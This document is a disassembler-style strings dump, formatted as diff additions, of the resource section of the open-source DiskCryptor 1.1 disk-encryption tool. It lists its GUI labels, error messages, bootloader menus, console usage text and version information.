+	.rsrc:46CFA0  boot
+	.rsrc:46CFB0  ERR_NAME }
+	.rsrc:46CFC8  \\?\
+	.rsrc:46CFEC  Volumes not found
+	.rsrc:46D010  %.08X
+	.rsrc:46D01C  Partitions not found
+	.rsrc:46D048  &Unmount
+	.rsrc:46D05C  &Mount
+	.rsrc:46D074  Error formatting volume [%s]
+	.rsrc:46D0B0  Bootloader on [%s] successfully updated
+	.rsrc:46D104  Error updated bootloader
+	.rsrc:46D138  \\.\%s
+	.rsrc:46D148  Warning
+	.rsrc:46D158  One volume on two disks
+	.rsrc:46D188  It's very strange..
+	.rsrc:46D1B0  Are you sure you want to remove bootloader
+	.rsrc:46D206  from [%s]?
+	.rsrc:46D220  Bootloader successfully removed from [%s]
+	.rsrc:46D278  Error removing bootloader
+	.rsrc:46D2B0  Removable media not correctly formatted
+	.rsrc:46D300  Format media?
+	.rsrc:46D320  Bootloader successfully installed to [%s]
+	.rsrc:46D374  Error install bootloader
+	.rsrc:46D3B8  Bootloader %s image file "%s" successfully created
+	.rsrc:46D420  Error creating %s image
+	.rsrc:46D450  Error start decrypt volume [%s]
+	.rsrc:46D490  Not enough space after partitions to install bootloader.
+	.rsrc:46D504  Install bootloader to first HDD track?
+	.rsrc:46D552  (incompatible with third-party bootmanagers, like GRUB)
+	.rsrc:46D5C4  Encrypt iso-file
+	.rsrc:46D5E8  Iso-image "%s" successfully encrypted to "%s"
+	.rsrc:46D644  Error encrypt iso-image "%s"
+	.rsrc:46D680  Error start encrypt volume [%s]
+	.rsrc:46D6C0  reencrypt
+	.rsrc:46D6D4  encrypt
+	.rsrc:46D6E4  format
+	.rsrc:46D6F4  Error start %s volume [%s]
+	.rsrc:46D730  Error start reencrypt volume [%s]
+	.rsrc:46D774  FAT32
+	.rsrc:46D780  Error start format volume [%s]
+	.rsrc:46D7C0  Unmount volume [%s]?
+	.rsrc:46D7F0  This volume contains opened files.
+	.rsrc:46D836  Would you like to force a unmount on this volume?
+	.rsrc:46D89C  Error unmount volume [%s]
+	.rsrc:46D8D8  Error when adding mount point
+	.rsrc:46D914  Error mount volume [%s]
+	.rsrc:46D944  open
+	.rsrc:46D950  Mounted devices: %d
+	.rsrc:46D978  Unmount all volumes?
+	.rsrc:46D9A4  Error change password
+	.rsrc:46D9D0  Password successfully changed for [%s]
+	.rsrc:46DA20  Wipe All Passwords?
+	.rsrc:46DA48  %s.bin
+	.rsrc:46DA58  Save backup volume header to file
+	.rsrc:46DAA0  Volume header backup successfully saved to
+	.rsrc:46DAF6  "%s"
+	.rsrc:46DB00  Error save volume header backup
+	.rsrc:46DB40  Open backup volume header
+	.rsrc:46DB78  Volume header successfully restored from
+	.rsrc:46DBCA  "%s"
+	.rsrc:46DBD8  Error restore volume header from backup
+	.rsrc:46DC28  Ctrl + 
+	.rsrc:46DC38  Shift + 
+	.rsrc:46DC4C  Alt + 
+	.rsrc:46DC6C  NumPad %d
+	.rsrc:46DC80  NumPad *
+	.rsrc:46DC94  NumPad -
+	.rsrc:46DCA8  NumPad .
+	.rsrc:46DCBC  NumPad /
+	.rsrc:46DCD0  NumPad +
+	.rsrc:46DCF4  Caps Lock
+	.rsrc:46DD08  Num Lock
+	.rsrc:46DD1C  Scroll Lock
+	.rsrc:46DD34  Insert
+	.rsrc:46DD44  Delete
+	.rsrc:46DD74  Pause
+	.rsrc:46DD80  Spacebar
+	.rsrc:46DD94  Page Up
+	.rsrc:46DDA4  Right Arrow
+	.rsrc:46DDBC  Backspace
+	.rsrc:46DDD0  Home
+	.rsrc:46DDDC  Left Arrow
+	.rsrc:46DDF4  Page Down
+	.rsrc:46DE08  Down Arrow
+	.rsrc:46DE28  Up Arrow
+	.rsrc:46DE44  Enter
+	.rsrc:46DE50  Left Windows
+	.rsrc:46DE6C  Right Windows
+	.rsrc:46DE88  Applications key
+	.rsrc:46DEAC  Browser Back
+	.rsrc:46DEC8  Browser Forward
+	.rsrc:46DEE8  Browser Refresh
+	.rsrc:46DF08  Browser Stop
+	.rsrc:46DF24  Browser Search
+	.rsrc:46DF44  Browser Favorites
+	.rsrc:46DF68  Browser Start and Home
+	.rsrc:46DF98  Volume Mute
+	.rsrc:46DFB0  Volume Down
+	.rsrc:46DFC8  Volume Up
+	.rsrc:46DFDC  Next Track
+	.rsrc:46DFF4  Previous Track
+	.rsrc:46E014  Stop Media
+	.rsrc:46E02C  Play/Pause Media
+	.rsrc:46E050  Start Mail
+	.rsrc:46E068  Select Media
+	.rsrc:46E084  Start Application 1
+	.rsrc:46E0AC  Start Application 2
+	.rsrc:46E0D4  Duplicated Hotkey: "%s"
+	.rsrc:46E104  Error
+	.rsrc:46E110  Install DiskCryptor driver?
+	.rsrc:46E148  DC_UPD_%d
+	.rsrc:46E15C  Update DiskCryptor?
+	.rsrc:46E184  Error GUI initialization
+	.rsrc:46E1B8  Admin Privileges Required
+	.rsrc:46E1F0  Please use x64 version of DiskCryptor
+	.rsrc:46E240  DiskCryptor 0.1-0.4 installed, please completely uninstall it before use this version.
+	.rsrc:46E2F0  Can not open DC device
+	.rsrc:46E320  DiskCryptor driver v%d detected
+	.rsrc:46E360  Please use last program version
+	.rsrc:46E3A0  DC_UI_DLG_CLASS
+	.rsrc:46E3C0  Can not initialize RNG
+	.rsrc:46E3F0  Error get config
+	.rsrc:46E414  Keyfiles not loaded
+	.rsrc:46E444  %-.2f mb/s
+	.rsrc:46E45C  http://diskcryptor.net/
+	.rsrc:46E48C  http://diskcryptor.net/forum
+	.rsrc:46E4D2  8DiskCryptor
+	.rsrc:46E4EC  %s %S
+	.rsrc:46E4F8  This program is free software: you can redistribute it under the terms of the GNU General Public License version 3 as published by the Free Software Foundation.
+	.rsrc:46E640  Contacts:
+	.rsrc:46E656  ntldr@diskcryptor.net (PGP key ID 0xC48251EB4F8E4E6E)
+	.rsrc:46E6C8  Special thanks to:
+	.rsrc:46E6F0  Aleksey Bragin and ReactOS Foundation
+	.rsrc:46E742  Portions of this software:
+
+	.rsrc:46ED70  Not supported
+	.rsrc:46ED8C  Enabled
+	.rsrc:46EDA0  Intel
+	.rsrc:46EDAC   AES Instructions Set (AES-NI)
+	.rsrc:46EDF0  The VIA PadLock Advanced Cryptography Engine (ACE)
+	.rsrc:46EE58  Hardware Cryptography: %s
+	.rsrc:46EE8E  Instruction Set: %s
+	.rsrc:46EEB8  %s / %s
+	.rsrc:46EEC8  %.2f %%
+	.rsrc:46EED8  encrypting
+	.rsrc:46EEF0  formatting
+	.rsrc:46EF0C  Encrypting/decrypting
+	.rsrc:46EF38  Formatting
+	.rsrc:46EF50  %s was suspended for volume%s %s.
+	.rsrc:46EF96  Continue %s?
+	.rsrc:46EFB0  &Remove Loader
+	.rsrc:46EFD0  &Update Loader
+	.rsrc:46EFF0  C&hange Config
+	.rsrc:46F010  &Install Loader
+	.rsrc:46F030  Use Keyfile
+	.rsrc:46F048  loader.iso
+	.rsrc:46F060  loader.img
+	.rsrc:46F078  Save Bootloader File As
+	.rsrc:46F0A8  Open iso-file to encrypt
+	.rsrc:46F0DC  encrypted.
+	.rsrc:46F0FC  Save encrypted iso-file to...
+	.rsrc:46F138  not found
+	.rsrc:46F14C  &Create Loader
+	.rsrc:46F172  dFile / Folder Path
+	.rsrc:46F19C  < .. list is empty .. >
+	.rsrc:46F1CC  Folder
+	.rsrc:46F1DC  File
+	.rsrc:46F1E8  %s "%s" already exists in keyfiles list
+	.rsrc:46F238  keyfile
+	.rsrc:46F248  Save 64 bytes random keyfile as..
+	.rsrc:46F290  Keyfile "%s" successfully created
+	.rsrc:46F2DA  d this file to the keyfiles list?
+	.rsrc:46F320  Error creating Keyfile
+	.rsrc:46F350  Choice folder..
+	.rsrc:46F370  Select File..
+	.rsrc:46F390  Embedded keyfile must be 64 byte size
+	.rsrc:46F3DC  Can't allocate memory
+	.rsrc:46F408  [NO_ICONS]
+	.rsrc:46F420  Info
+	.rsrc:46F42C  &Format
+	.rsrc:46F43C  &Change Password
+	.rsrc:46F460  &Encrypt
+	.rsrc:46F474  &Reencrypt
+	.rsrc:46F48C  &Decrypt
+	.rsrc:46F4A0  Remove DiskCryptor driver?
+	.rsrc:46F4D8  Error remove DiskCryptor driver
+	.rsrc:46F518  Are you sure you want to delete mount point [%s]?
+	.rsrc:46F57C  Crash?
+	.rsrc:46F58C  U&nmount All
+	.rsrc:46F5A8  Mount &All
+	.rsrc:46F5C0  &Settings
+	.rsrc:46F5D4  &About
+	.rsrc:46F5E4  E&xit
+	.rsrc:46F5F0  # Mount Settings
+	.rsrc:46F614  # Password Caching
+	.rsrc:46F63C  # Boot Options
+	.rsrc:46F65C  # Extended Settings
+	.rsrc:46F684   (not supported)
+	.rsrc:46F6A8  General
+	.rsrc:46F6B8  Extended
+	.rsrc:46F6CC  Hot Keys
+	.rsrc:46F6E0  Set Hotkey for call BSOD?
+	.rsrc:46F714  # Current Password
+	.rsrc:46F73C  # New Password
+	.rsrc:46F75C  # Password Rating
+	.rsrc:46F780  [%s] - %s
+	.rsrc:46F794  Change password
+	.rsrc:46F7B4  Enter password
+	.rsrc:46F7D4  # Mount Options
+	.rsrc:46F7F4  Choice folder for mount point
+	.rsrc:46F830  Error getting bootloader configuration
+	.rsrc:46F880  Main
+	.rsrc:46F88C  Authentication
+	.rsrc:46F8AC  Invalid password
+	.rsrc:46F8D0  Other Settings
+	.rsrc:46F8F0  Bootloader config for [%s]
+	.rsrc:46F928  You must select partition by id
+	.rsrc:46F968  Keyfile not loaded
+	.rsrc:46F990  Error set bootloader configuration
+	.rsrc:46F9D8  &Save Changes
+	.rsrc:46F9F4  NTFS
+	.rsrc:46FA08  Error create thread
+	.rsrc:46FA30  # Choice iso-file
+	.rsrc:46FA54  # Format Options
+	.rsrc:46FA78  # Encryption Settings
+	.rsrc:46FAA4  # Boot Settings
+	.rsrc:46FAC4  # Volume Password
+	.rsrc:46FAE8  # Encryption Progress
+	.rsrc:46FB18  Your BIOS does not provide enough base memory,
+	.rsrc:46FB76  you can only use AES to encrypt the boot partition!
+	.rsrc:46FBE0  Use external bootloader
+	.rsrc:46FC10  Bootable HDD not found!
+	.rsrc:46FC40  Install to HDD
+	.rsrc:46FC60  Use Keyfiles
+	.rsrc:46FC84  &Next
+	.rsrc:46FC90  Do you really want to interrupt the encryption
+	.rsrc:46FCEE  of an iso-file?
+	.rsrc:46FD10  %d hr.%s
+	.rsrc:46FD24  %d min.
+	.rsrc:46FD34  %s%d sec.
+	.rsrc:46FD48  %.1f mb/sec.
+	.rsrc:46FD64  Sector: %I64d
+	.rsrc:46FD84  Total Sectors: %I64d
+	.rsrc:46FDB8  HMAC-SHA-512
+	.rsrc:46FDD4  Cancel
+	.rsrc:46FDE4  Action
+	.rsrc:46FDF6  Error code: %d
+	.rsrc:46FE14  Information
+	.rsrc:46FE2C  Confirm
+	.rsrc:46FE3C  mounted
+	.rsrc:46FE4C  decrypt
+	.rsrc:46FE5C  %s %.02d%%
+	.rsrc:46FE74  SeShutdownPrivilege
+	.rsrc:46FE9C  Format error on volume [%s]
+	.rsrc:46FED4  Encryption
+	.rsrc:46FEEC  Decryption
+	.rsrc:46FF04  Reencryption
+	.rsrc:46FF20  %s error on volume [%s]
+	.rsrc:46FF50  riched20.dll
+	.rsrc:46FF6C  SysListView32
+	.rsrc:46FF88  ComboBox
+	.rsrc:46FF9C  Button
+	.rsrc:46FFAC  Error get volume information
+	.rsrc:471B38  %s\drivers\%s.sys
+	.rsrc:471B5C  %s\drivers\%s.sys
+	.rsrc:471B80  %s\drivers\%s.sys
+	.rsrc:471BA4  %s\drivers\%s.sys
+	.rsrc:471BC8  %s\drivers\%s.sys
+	.rsrc:471BEC  %s\drivers\%s.sys
+	.rsrc:471CBC  %s\drivers\%s.sys
+	.rsrc:471D6C  %s\drivers\%s.sys
+	.rsrc:471D90  %s\drivers\%s.sys
+	.rsrc:471DB4  %s\drivers\%s.sys
+	.rsrc:471DD8  %s\drivers\%s.sys
+	.rsrc:471E1C  %s\drivers\%s.sys
+	.rsrc:471E40  %s\drivers\%s.sys
+	.rsrc:471E64  %s\drivers\%s.sys
+	.rsrc:471E88  %s\drivers\%s.sys
+	.rsrc:471EC0  You must restart your computer before the new settings will take effect.
+	.rsrc:471F54  Do you want to restart your computer now?
+	.rsrc:471FA8  %s\drivers\%s.sys
+	.rsrc:471FCC  %s\drivers\%s.sys
+	.rsrc:471FF0  %s\drivers\%s.sys
+	.rsrc:472014  %s\drivers\%s.sys
+	.rsrc:472038  %s\drivers\%s.sys
+	.rsrc:472530  %s\drivers\%s.sys
+	.rsrc:472558  Software\Microsoft\Windows\CurrentVersion\Run
+	.rsrc:4725B8  Software\Microsoft\Windows\CurrentVersion\RunOnce
+	.rsrc:47261C  DiskCryptor
+	.rsrc:473356  333f3
+	.rsrc:4733E2  f3fff
+	.rsrc:479732  &File
+	.rsrc:479742  Uninstall Driver
+	.rsrc:47976E  Exit
+	.rsrc:47977A  &Volumes
+	.rsrc:479790  Encrypt Volume
+	.rsrc:4797B2  Decrypt Volume
+	.rsrc:4797D4  Reencrypt Volume
+	.rsrc:479800  Format Volume
+	.rsrc:479826  Mount Volume
+	.rsrc:479844  Mount All Volumes
+	.rsrc:479872  Unmount Volume
+	.rsrc:479894  Unmount All Volumes
+	.rsrc:4798C6  Delete Mount Point
+	.rsrc:4798EE  &Tools
+	.rsrc:479900  Change Password
+	.rsrc:479924  Clear Cached Passwords
+	.rsrc:47995C  Backup Header
+	.rsrc:47997C  Restore Header
+	.rsrc:4799A4  Benchmark
+	.rsrc:4799C2  Blue Screen
+	.rsrc:4799E4  Encrypt CD
+	.rsrc:479A04  Config Bootloader
+	.rsrc:479A2C  Settings
+	.rsrc:479A40  &Help
+	.rsrc:479A50  About
+	.rsrc:479A60  Home&page
+	.rsrc:479A7A  Popup
+	.rsrc:479A8A  Setup bootloader
+	.rsrc:479AB0  Delete bootloader
+	.rsrc:479AD8  Update bootloader
+	.rsrc:479B00  Change Config
+	.rsrc:479B26  Update to last volume format
+	.rsrc:479B7C  jDC_UI_DLG_CLASS
+	.rsrc:479B9E  DiskCryptor
+	.rsrc:479BBC  MS Shell Dlg
+	.rsrc:479BF0  SysListView32
+	.rsrc:479C2C  &Mount
+	.rsrc:479C58  &Encrypt
+	.rsrc:479C88  &Decrypt
+	.rsrc:479CB8  &Mount All
+	.rsrc:479CEC  &Unmount All
+	.rsrc:479D64   Disk Drives
+	.rsrc:479DDC  Resizing..
+	.rsrc:479E0C  SysTabControl32
+	.rsrc:479E56  MS Shell Dlg
+	.rsrc:479EAC  &Show Password
+	.rsrc:479EE8  &Use Keyfiles
+	.rsrc:479F24  &Keyfiles
+	.rsrc:479F78  &Set Mount Point
+	.rsrc:479FE0  &Cancel
+	.rsrc:47A050  Password:
+	.rsrc:47A0A4  Mount Path:
+	.rsrc:47A0DC  Password:
+	.rsrc:47A130  Status:
+	.rsrc:47A18A  MS Shell Dlg
+	.rsrc:47A1C0  &Show Password
+	.rsrc:47A1FC  &Use Keyfiles
+	.rsrc:47A238  &Keyfiles
+	.rsrc:47A2AC  &Show Password
+	.rsrc:47A2E8  &Use Keyfiles
+	.rsrc:47A324  &Keyfiles
+	.rsrc:47A380  &Cancel
+	.rsrc:47A3B0  Unbreakable
+	.rsrc:47A3E8  High
+	.rsrc:47A410  Medium
+	.rsrc:47A464  Trivially Breakable
+	.rsrc:47A4AC  All Other
+	.rsrc:47A4E0  Caps Latin
+	.rsrc:47A514  Small Latin
+	.rsrc:47A54C  Digits
+	.rsrc:47A578  Space
+	.rsrc:47A5A4  Special Symbols
+	.rsrc:47A620  msctls_progress32
+	.rsrc:47A684  &Password:
+	.rsrc:47A6F8  &Password:
+	.rsrc:47A72C  &Confirm:
+	.rsrc:47A780  Status:
+	.rsrc:47A7D0  Status:
+	.rsrc:47A822  Settings
+	.rsrc:47A83A  MS Shell Dlg
+	.rsrc:47A870  &Cancel
+	.rsrc:47A904  SysTabControl32
+	.rsrc:47A96E  MS Shell Dlg
+	.rsrc:47A9A4  Force Unmount
+	.rsrc:47A9E0  Open Explorer on Mount
+	.rsrc:47AA2C  Unmount All on LogOff (enable autorun)
+	.rsrc:47AA98  Wipe Cached Passwords on Exit / LogOff (enable autorun)
+	.rsrc:47AB28  Cache Passwords in Memory
+	.rsrc:47AB7C  Run on Windows Logon
+	.rsrc:47ABC4  Enable Automounting at Boot Time
+	.rsrc:47AC8E  MS Shell Dlg
+	.rsrc:47ADC4  Use Extended Buttons
+	.rsrc:47AE0C  Mount All
+	.rsrc:47AE40  Force Unmount All
+	.rsrc:47AE84  Wipe Passwords
+	.rsrc:47AEC0  Blue Screen
+	.rsrc:47AF02  MS Shell Dlg
+	.rsrc:47AF78  &Back
+	.rsrc:47AFA4  &Next
+	.rsrc:47AFD0  &Cancel
+	.rsrc:47B00A  MS Shell Dlg
+	.rsrc:47B080  Algorithm:
+	.rsrc:47B0D4  Wipe Mode:
+	.rsrc:47B132  MS Shell Dlg
+	.rsrc:47B188  &Create Bootloader
+	.rsrc:47B1EC  This partition needed for system booting
+	.rsrc:47B278  SysListView32
+	.rsrc:47B2BE  MS Shell Dlg
+	.rsrc:47B2F0  SysListView32
+	.rsrc:47B336  MS Shell Dlg
+	.rsrc:47B36C  &Pause
+	.rsrc:47B3B4  SysListView32
+	.rsrc:47B3EC  msctls_progress32
+	.rsrc:47B430  Sector
+	.rsrc:47B45C  Wipe Mode
+	.rsrc:47B49A  MS Shell Dlg
+	.rsrc:47B530  &Show Password
+	.rsrc:47B56C  &Use Keyfiles
+	.rsrc:47B5A8  &Keyfiles
+	.rsrc:47B5DC  Password:
+	.rsrc:47B610  Confirm:
+	.rsrc:47B640  Layout:
+	.rsrc:47B68C  msctls_progress32
+	.rsrc:47B6D0  Unbreakable
+	.rsrc:47B708  High
+	.rsrc:47B730  Medium
+	.rsrc:47B784  Trivially Breakable
+	.rsrc:47B7CC  All Other
+	.rsrc:47B800  Caps Latin
+	.rsrc:47B834  Small Latin
+	.rsrc:47B86C  Digits
+	.rsrc:47B898  Space
+	.rsrc:47B8C4  Special Symbols
+	.rsrc:47B944  Status:
+	.rsrc:47B976  Bootloader config
+	.rsrc:47B9A0  MS Shell Dlg
+	.rsrc:47B9F8  &Install Boot
+	.rsrc:47BA34  &Cancel
+	.rsrc:47BA64  &Change Config
+	.rsrc:47BAA0  &Update Loader
+	.rsrc:47BB06  MS Shell Dlg
+	.rsrc:47BB58  SysTabControl32
+	.rsrc:47BBC2  MS Shell Dlg
+	.rsrc:47BC14  SysListView32
+	.rsrc:47BC50  Small bootloader, only with AES
+	.rsrc:47BD14  Bootloader place
+	.rsrc:47BD54  Select device
+	.rsrc:47BD90  Select path to file
+	.rsrc:47BE02  MS Shell Dlg
+	.rsrc:47BE78  Booting Method
+	.rsrc:47BEB4  Keyboard Layout
+	.rsrc:47BEF4  Select partition:
+	.rsrc:47BF34  SysListView32
+	.rsrc:47BF7A  MS Shell Dlg
+	.rsrc:47BFD0  Password prompt message
+	.rsrc:47C01C  RichEdit20W
+	.rsrc:47C094  Cancel timeout if any key pressed
+	.rsrc:47C0F8  Config embedded keyfile
+	.rsrc:47C148  Authentication timeout
+	.rsrc:47C194  Show entered password
+	.rsrc:47C1E0  Authentication type
+	.rsrc:47C228  [0 / 120]
+	.rsrc:47C266  MS Shell Dlg
+	.rsrc:47C29C  Use incorrect password action if no password entered
+	.rsrc:47C324  Invalid password message
+	.rsrc:47C370  RichEdit20W
+	.rsrc:47C3C8  Invalid password action
+	.rsrc:47C418  [0 / 64]
+	.rsrc:47C44A  About
+	.rsrc:47C45C  MS Shell Dlg
+	.rsrc:47C4D8  Static
+	.rsrc:47C504  Copyright 
+	.rsrc:47C51A   2007-2010 ntldr, jet-phryx
+	.rsrc:47C570  http://diskcryptor.net/index.php/DiskCryptor
+	.rsrc:47C5E8  Static
+	.rsrc:47C676  Encryption Benchmark
+	.rsrc:47C6A6  MS Shell Dlg
+	.rsrc:47C6D8  SysListView32
+	.rsrc:47C734  &Close
+	.rsrc:47C780  &Benchmark
+	.rsrc:47C7BE  MS Shell Dlg
+	.rsrc:47C89C  Select path to source file
+	.rsrc:47C8F0  Select path to destination file
+	.rsrc:47C95A  MS Shell Dlg
+	.rsrc:47C9B0  &Quick Format
+	.rsrc:47C9EC  File System
+	.rsrc:47CA46  Keyfiles
+	.rsrc:47CA5E  MS Shell Dlg
+	.rsrc:47CA94  &Add File..
+	.rsrc:47CACC  &Add Folder..
+	.rsrc:47CB08  &Remove Item
+	.rsrc:47CB40  &Remove All Items
+	.rsrc:47CB84  &Generate Keyfile
+	.rsrc:47CBF0  &Cancel
+	.rsrc:47CC1C  SysListView32
+	.rsrc:47CCC2  MS Shell Dlg
+	.rsrc:47CD34  msctls_progress32
+	.rsrc:47CD78  Encrypting iso-file..
+	.rsrc:47CDC0  SysListView32
+	.rsrc:47CE2E  MS Shell Dlg
+	.rsrc:47CE64  Use Hardware Cryptography When Possible
+	.rsrc:47CEDE  MS Shell Dlg
+	.rsrc:47CF14  Hide $dcsys$ Files
+	.rsrc:47CF58  Use Hardware Cryptography Support
+	.rsrc:47CFBC  Enable Optimization for SSD disks
+	.rsrc:47D020  Disable TRIM on Encrypted SSD disks
+	.rsrc:47D11A  VS_VERSION_INFO
+	.rsrc:47D176  StringFileInfo
+	.rsrc:47D19A  000904b0
+	.rsrc:47D1B2  FileDescription
+	.rsrc:47D1D4  DiskCryptor GUI
+	.rsrc:47D1FA  FileVersion
+	.rsrc:47D214  1.1.846.118
+	.rsrc:47D232  LegalCopyright
+	.rsrc:47D250  http://diskcryptor.net/
+	.rsrc:47D286  OriginalFilename
+	.rsrc:47D2A8  dcrypt.exe
+	.rsrc:47D2C6  ProductName
+	.rsrc:47D2E0  DiskCryptor
+	.rsrc:47D2FE  ProductVersion
+	.rsrc:47D32A  VarFileInfo
+	.rsrc:47D34A  Translation
+	.rsrc:47F473  <<<Obsolete>>
+	.rsrc:482010  -isenc
+	.rsrc:482020  -isboot
+	.rsrc:482030  -unldr
+	.rsrc:482040  -unins
+	.rsrc:482050  -setup
+	.rsrc:482BE6  VS_VERSION_INFO
+	.rsrc:482C42  StringFileInfo
+	.rsrc:482C66  000904b0
+	.rsrc:482C7E  FileDescription
+	.rsrc:482CA0  DiskCryptor installer support
+	.rsrc:482CE2  FileVersion
+	.rsrc:482CFC  1.1.846.118
+	.rsrc:482D1A  LegalCopyright
+	.rsrc:482D38  http://diskcryptor.net/
+	.rsrc:482D6E  OriginalFilename
+	.rsrc:482D90  dcinst.exe
+	.rsrc:482DAE  ProductName
+	.rsrc:482DC8  DiskCryptor
+	.rsrc:482DE6  ProductVersion
+	.rsrc:482E12  VarFileInfo
+	.rsrc:482E32  Translation
+	.rsrc:488D7C  0 - OFF
+	.rsrc:488D8C  1 - ON
+	.rsrc:488D9C  %d seconds
+	.rsrc:488DB4  disabled
+	.rsrc:488DC8  display "*"
+	.rsrc:488DF0  enabled
+	.rsrc:488E00  1 - On/Off "enter password" message (%s)
+	.rsrc:488E52  2 - Change display password type (%s)
+	.rsrc:488E9E  3 - Change password prompt text (%S)
+	.rsrc:488EE8  4 - Enable embedded keyfile (%s)
+	.rsrc:488F2A  5 - Change authentication timeout (%s)
+	.rsrc:488F78  6 - Cancel timeout if any key pressed (%s)
+	.rsrc:488FCE  7 - Return to main menu
+	.rsrc:489004  1 - disabled
+	.rsrc:48901E  2 - display "*"
+	.rsrc:489040  Enter new prompt text: 
+	.rsrc:489070  Please enter path to keyfile: 
+	.rsrc:4890B0  keyfile not loaded
+	.rsrc:4890D8  Embedded keyfile must be 64byte size
+	.rsrc:489128  1 - Use embedded keyfile and password
+	.rsrc:489174  2 - Use only embedded keyfile
+	.rsrc:4891B8  Enter new timeout in seconds or 0 to disable: 
+	.rsrc:489220  halt system
+	.rsrc:489238  reboot system
+	.rsrc:489254  boot from active partition
+	.rsrc:48928C  exit to BIOS
+	.rsrc:4892A8  retry authentication
+	.rsrc:4892D4  load boot disk MBR
+	.rsrc:489300  1 - On/Off invalid password message (%s)
+	.rsrc:489352  2 - Invalid password action (%s)
+	.rsrc:489394  3 - Invalid password message (%S)
+	.rsrc:4893D8  4 - Return to main menu
+	.rsrc:489410  1 - halt system
+	.rsrc:489430  2 - reboot system
+	.rsrc:489454  3 - boot from active partition
+	.rsrc:489492  4 - load boot disk MBR
+	.rsrc:4894C0  5 - exit to BIOS
+	.rsrc:4894E2  6 - retry authentication
+	.rsrc:489518  Enter new message text: 
+	.rsrc:48954E  Select partition:
+	.rsrc:489574  %d - pt%d (%s) (%s)
+	.rsrc:4895A0  Mounted partitions with valid disk_id not found
+	.rsrc:489604  load first disk MBR
+	.rsrc:48962C  load OS from active partition
+	.rsrc:489668  boot from first partition with appropriate password
+	.rsrc:4896D0  boot from pt%d (%s) (%s)
+	.rsrc:489708  boot from unknown partition, id %0.8x
+	.rsrc:489758  Current booting method: %s
+	.rsrc:489790  1 - Set "load first disk MBR"
+	.rsrc:4897CC  2 - Set "boot from first partition with appropriate password"
+	.rsrc:489848  3 - Set "boot from specified partition"
+	.rsrc:489898  4 - Return to main men
+	.rsrc:4898D0  Current booting method: %s
+	.rsrc:489908  1 - Set "load boot disk MBR"
+	.rsrc:489942  2 - Set "load first disk MBR"
+	.rsrc:48997E  3 - Set "load OS from active partition"
+	.rsrc:4899CE  4 - Set "boot from first partition with appropriate password"
+	.rsrc:489A4A  5 - Set "boot from specified partition"
+	.rsrc:489A9A  6 - Return to main menu
+	.rsrc:489AD0  QWERTY
+	.rsrc:489AE0  QWERTZ
+	.rsrc:489AF0  AZERTY
+	.rsrc:489B00  Current keyboard layout: %s
+	.rsrc:489B3A  1 - Set layout to "QWERTY"
+	.rsrc:489B70  2 - Set layout to "QWERTZ"
+	.rsrc:489BA6  3 - Set layout to "AZERTY"
+	.rsrc:489BDC  4 - Return to main menu
+	.rsrc:489C20  1 - Change logon options
+	.rsrc:489C52  2 - Change incorrect password action
+	.rsrc:489C9C  3 - Use incorrect password action if no password entered (%s)
+	.rsrc:489D18  4 - Use hardware cryptography when possible (%s)
+	.rsrc:489D7A  5 - Set booting method
+	.rsrc:489DA8  6 - Set bootauth keyboard layout
+	.rsrc:489DEA  7 - Save changes and exit
+	.rsrc:489E24  -small
+	.rsrc:489E34  -enum
+	.rsrc:489E40  --------------------------------------------------------------
+	.rsrc:489EBE  HDD |           name           |  size   | bootable | bootloader
+	.rsrc:489F40  ----+--------------------------+---------+----------+-----------
+	.rsrc:489FC4  installed
+	.rsrc:489FD8  none
+	.rsrc:489FF8  hd%d | %-24s | %-8s| %-8s | %s
+	.rsrc:48A038  -setmbr
+	.rsrc:48A048  Bootloader successfully installed to %s
+	.rsrc:48A09C  -delmbr
+	.rsrc:48A0B0  Bootloader successfully removed from %s
+	.rsrc:48A104  -updmbr
+	.rsrc:48A118  Bootloader on %s successfully updated
+	.rsrc:48A168  -setpar
+	.rsrc:48A178  Removable media not correctly formatted
+	.rsrc:48A1C8  Format media? (Y/N)
+	.rsrc:48A1F4  Please set bootloader options:
+	.rsrc:48A238  Bootloader successfully installed
+	.rsrc:48A280  -makeiso
+	.rsrc:48A298  Bootloader .iso image successfully created
+	.rsrc:48A2F0  -makepxe
+	.rsrc:48A308  Bootloader PXE image successfully created
+	.rsrc:48A360  -config
+	.rsrc:48A370  Please change bootloader options:
+	.rsrc:48A3B8  Bootloader configuration successfully changed
+	.rsrc:48A418  DiskCryptor (c) <ntldr@diskcryptor.net> PGP key ID - 0xC48251EB4F8E4E6E
+	.rsrc:48A4AA  Usage: dccon [key] [param]
+	.rsrc:48A4E0  ________________________________________________________________________________
+	.rsrc:48A584   -enum                           Enum all volume devices in system
+	.rsrc:48A60A   -info [dev]                     Display information about device
+	.rsrc:48A68E   -version                        Display DiskCryptor version
+	.rsrc:48A708   -benchmark                      Encryption benchmark
+	.rsrc:48A774   -config                         Change program configuration
+	.rsrc:48A7F0   -keygen [file]                  Make 64 bytes random keyfile
+	.rsrc:48A86C   -bsod                           Erase all keys in memory and generate BSOD
+	.rsrc:48A904  ________________________________________________________________________________
+	.rsrc:48A9A8   -addpass [param]                Add password to password cache
+	.rsrc:48AA28      -p  [password]        Get password from command line
+	.rsrc:48AA9A      -kf [keyfiles path]   Use keyfiles
+	.rsrc:48AAE8   -clean                          Wipe cached passwords in memory
+	.rsrc:48AB6A  ________________________________________________________________________________
+	.rsrc:48AC0E   -mount [dev] [param]            Mount encrypted device
+	.rsrc:48AC7E      -mp [mount point]     Add volume mount point
+	.rsrc:48ACE0      -p  [password]        Get password from command line
+	.rsrc:48AD52      -kf [keyfiles path]   Use keyfiles
+	.rsrc:48ADA0   -mountall [param]               Mount all encrypted devices
+	.rsrc:48AE1A      -p  [password]        Get password from command line
+	.rsrc:48AE8C      -kf [keyfiles path]   Use keyfiles
+	.rsrc:48AEDA   -unmount [dev] [param]          Unmount encrypted device
+	.rsrc:48AF4E      -f                    Force unmount with close all opened files
+	.rsrc:48AFD6      -dp                   Delete volume mount point
+	.rsrc:48B03E   -unmountall                     Force unmount all devices
+	.rsrc:48B0B4  ________________________________________________________________________________
+	.rsrc:48B158   -encrypt [dev] [param]          Encrypt volume device
+	.rsrc:48B1C6      -p  [password]        Get password from command line
+	.rsrc:48B238      -kf [keyfiles path]   Use keyfiles
+	.rsrc:48B286               ======  Cipher settings:   ======
+	.rsrc:48B2E4      -a                    AES cipher
+	.rsrc:48B32E      -t                    Twofish cipher
+	.rsrc:48B380      -s                    Serpent cipher
+	.rsrc:48B3D2      -at                   AES-Twofish ciphers chain
+	.rsrc:48B43A      -ts                   Twofish-Serpent ciphers chain
+	.rsrc:48B4AA      -sa                   Serpent-AES ciphers chain
